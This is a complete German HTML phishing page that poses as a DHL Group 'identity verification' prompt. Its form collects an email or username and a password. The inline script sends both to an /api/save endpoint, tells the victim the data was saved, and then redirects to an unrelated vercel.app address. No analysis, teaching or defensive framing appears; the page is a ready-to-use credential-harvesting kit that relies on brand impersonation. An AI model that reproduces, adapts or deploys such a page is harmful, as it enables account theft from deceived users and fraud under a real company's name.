<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <title>Identitätsprüfung</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 100px;
      background-color: #f9f9f9;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 10px;
      display: inline-block;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      margin: 10px;
      padding: 10px;
      width: 250px;
    }
    input[type="submit"] {
      background-color: #007bff;
      color: white;
      border: none;
      cursor: pointer;
    }
    #message {
      margin-top: 15px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h2>Verifizierung erforderlich</h2>
  <p>Bitte geben Sie Ihre Zugangsdaten ein, um fortzufahren.</p>
  
  <form id="loginForm">
    <input type="text" name="email" placeholder="E-Mail oder Benutzername" required /><br />
    <input type="password" name="password" placeholder="Passwort" required /><br />
    <input type="submit" value="Bestätigen" />
  </form>

  <p id="message"></p>
  
  <p style="font-size: 12px; color: gray;">© 2025 DHL Group – Datenschutz • Impressum</p>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const email = e.target.email.value;
      const password = e.target.password.value;

      try {
        const res = await fetch('/api/save', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password })
        });
        if (res.ok) {
          document.getElementById('message').textContent = 'Daten wurden gespeichert!';
          e.target.reset();
          setTimeout(() => {
            window.location.href = 'https://louisa-handynummer-gabriel-schatzsu.vercel.app/';
          }, 5000);
        } else {
          throw new Error('Fehler beim Speichern');
        }
      } catch (err) {
        document.getElementById('message').textContent = 'Ups, da lief was schief.';
      }
    });
  </script>

</body>
</html>
